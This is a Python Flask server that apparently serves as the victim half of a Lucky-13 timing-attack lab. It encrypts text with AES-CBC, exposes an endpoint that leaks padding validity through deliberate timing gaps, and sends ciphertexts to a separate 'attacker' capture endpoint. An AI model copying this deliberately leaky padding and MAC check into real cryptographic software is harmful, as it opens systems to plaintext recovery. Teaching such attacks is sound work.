#!/usr/bin/env python3
"""
Lucky-13 style timing oracle demo server.
Run this in Terminal 1.

- Encrypts plaintext with AES-CBC
- Uses TLS-style layout: plaintext || HMAC || PKCS#7 padding
- Exposes /lucky13_oracle that leaks timing (not explicit padding valid/invalid)
- Sends ciphertext to attacker on /capture
"""

import hmac
import logging
import os
import socket
import threading
import time
from hashlib import sha256

import requests as http_req
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from flask import Flask, jsonify, request

BLOCK_SIZE = 16
MAC_SIZE = 32

ENC_KEY = os.urandom(16)
MAC_KEY = os.urandom(32)

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5000
ATTACKER_PORT = 5001

app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)


def fmt(data):
    return " ".join(str(b) for b in data)


def get_local_ip():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def encrypt_tls_style(msg):
    raw = msg.encode()
    mac = hmac.new(MAC_KEY, raw, sha256).digest()
    inner = raw + mac
    padded = pad(inner, BLOCK_SIZE)
    iv = os.urandom(BLOCK_SIZE)
    ct = AES.new(ENC_KEY, AES.MODE_CBC, iv=iv).encrypt(padded)
    return iv, ct, padded


@app.route("/lucky13_oracle", methods=["POST"])
def lucky13_oracle():
    """
    Deliberately vulnerable:
    - checks padding first
    - does variable amount of MAC work only when padding structure looks valid
    - adds a clear delay gap so timing attack is stable in local demo
    """
    try:
        ct = bytes.fromhex(request.get_json(force=True).get("ciphertext", ""))
        if len(ct) < 2 * BLOCK_SIZE or len(ct) % BLOCK_SIZE != 0:
            return jsonify({"status": "ok"})

        iv, body = ct[:BLOCK_SIZE], ct[BLOCK_SIZE:]
        pt = AES.new(ENC_KEY, AES.MODE_CBC, iv=iv).decrypt(body)

        valid_padding = False
        pad_len = 0
        if pt:
            pad_len = pt[-1]
            valid_padding = 1 <= pad_len <= BLOCK_SIZE and pt[-pad_len:] == bytes([pad_len]) * pad_len

        if valid_padding:
            unpadded = pt[:-pad_len]
            if len(unpadded) >= MAC_SIZE:
                msg = unpadded[:-MAC_SIZE]
                recv_mac = unpadded[-MAC_SIZE:]

                # Variable work simulates MAC processing differences (Lucky-13 style).
                loops = 80 + (len(unpadded) % BLOCK_SIZE) * 10 + pad_len * 8
                calc = recv_mac
                for _ in range(loops):
                    calc = hmac.new(MAC_KEY, msg, sha256).digest()
                _ = hmac.compare_digest(calc, recv_mac)

            # Strong timing signal for demo stability.
            time.sleep(0.006)
        else:
            _ = hmac.new(MAC_KEY, b"x", sha256).digest()
            time.sleep(0.0003)
    except Exception:
        pass

    # Always generic response; attacker relies on timing.
    return jsonify({"status": "ok"})


def main():
    local_ip = get_local_ip()
    attacker_ip = input("Enter attacker PC IP (blank for localhost): ").strip() or "127.0.0.1"
    attacker_url = f"http://{attacker_ip}:{ATTACKER_PORT}/capture"

    threading.Thread(
        target=lambda: app.run(host=SERVER_HOST, port=SERVER_PORT, threaded=True),
        daemon=True,
    ).start()

    print("=" * 58)
    print("LUCKY-13 DEMO SERVER (AES-CBC + HMAC + padding)")
    print(f"This PC IP : {local_ip}")
    print(f"Oracle     : http://{local_ip}:{SERVER_PORT}/lucky13_oracle")
    print(f"Attacker   : {attacker_url}")
    print(f"Enc key    : {fmt(ENC_KEY)}")
    print("=" * 58)

    while True:
        try:
            msg = input("\nEnter plaintext (or 'quit'): ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nInput closed.")
            return

        if not msg:
            continue
        if msg.lower() == "quit":
            break

        iv, ct, padded = encrypt_tls_style(msg)
        print(f"Plaintext      : {msg}")
        print(f"Padded bytes   : {len(padded)}")
        print(f"IV + ciphertext: {fmt(iv + ct)}")

        try:
            http_req.post(attacker_url, json={"ciphertext": (iv + ct).hex()}, timeout=3)
            print("Status         : Sent to attacker")
        except Exception:
            print("Status         : Attacker not running")


if __name__ == "__main__":
    main()
